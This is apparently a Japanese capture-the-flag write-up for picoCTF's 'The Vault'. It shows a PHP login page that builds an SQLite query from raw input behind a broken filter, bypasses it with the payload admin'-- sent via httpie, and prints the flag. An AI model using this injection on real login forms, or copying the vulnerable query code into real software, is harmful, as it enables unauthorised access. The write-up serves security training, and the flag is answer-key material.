# The Vault

## Solve
```
There is a website running at http://2018shell.picoctf.com:49030 (link). 
Try to see if you can login!
```

## Hint
`no`

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/83613609-fcb04080-a5be-11ea-8c54-bc157fa5d421.png)

問題に移動するとloginページとphpのソースコード先が表示されました。

```php
<?php
  ini_set('error_reporting', E_ALL);
  ini_set('display_errors', 'On');

  include "config.php";
  $con = new SQLite3($database_file);

  $username = $_POST["username"];
  $password = $_POST["password"];
  $debug = $_POST["debug"];
  $query = "SELECT 1 FROM users WHERE name='$username' AND password='$password'";

  if (intval($debug)) {
    echo "<pre>";
    echo "username: ", htmlspecialchars($username), "\n";
    echo "password: ", htmlspecialchars($password), "\n";
    echo "SQL query: ", htmlspecialchars($query), "\n";
    echo "</pre>";
  }

  //validation check
  $pattern ="/.*['\"].*OR.*/i";
  $user_match = preg_match($pattern, $username);
  $password_match = preg_match($pattern, $username);
  if($user_match + $password_match > 0)  {
    echo "<h1>SQLi detected.</h1>";
  }
  else {
    $result = $con->query($query);
    $row = $result->fetchArray();
    
    if ($row) {
      echo "<h1>Logged in!</h1>";
      echo "<p>Your flag is: $FLAG</p>";
    } else {
      echo "<h1>Login failed.</h1>";
    }
  }
  
?>
```

<br>

以下の部分でSQLiが行えると思われます。

```php
 $query = "SELECT 1 FROM users WHERE name='$username' AND password='$password'";
```

なので単純に`admin'--`という感じで送ってみます。

`--`にはそれ以降を無効にする、という機能があります。

```http
$ http -f POST http://2018shell.picoctf.com:49030/login.php "username=admin'--"
HTTP/1.1 200 OK
Content-type: text/html; charset=UTF-8

<br />
<b>Notice</b>:  Undefined index: password in <b>/problems/the-vault_0_a4d9fbaa1c6198d4d05f74760d9ac93e/webroot/login.php</b> on line <b>9</b><br />
<br />
<b>Notice</b>:  Undefined index: debug in <b>/problems/the-vault_0_a4d9fbaa1c6198d4d05f74760d9ac93e/webroot/login.php</b> on line <b>10</b><br />
<h1>Logged in!</h1><p>Your flag is: picoCTF{w3lc0m3_t0_th3_vau1t_c4738171}</p>
```

するとloginが出来てflagが表示されました。

<br><br>

## FLAG: picoCTF{w3lc0m3_t0_th3_vau1t_c4738171}
